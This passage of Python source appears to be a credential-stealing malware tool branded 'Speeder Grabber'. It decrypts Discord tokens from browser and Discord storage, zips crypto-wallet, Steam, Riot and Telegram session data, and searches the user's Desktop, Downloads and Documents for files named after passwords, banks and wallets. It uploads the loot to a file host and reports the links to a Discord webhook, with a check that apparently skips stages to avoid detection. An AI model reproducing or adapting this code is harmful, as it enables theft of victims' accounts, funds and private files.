    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Speeder Grabber Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Speeder Grabber",
                "icon_url": "https://imgur.com/fue44s9.jpg"
            }
            }
        ],
        "username": "Speeder Grabber",
        "avatar_url": "https://imgur.com/fue44s9.jpg",
        "attachments": []
    }
    urlopen(Request(hookx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
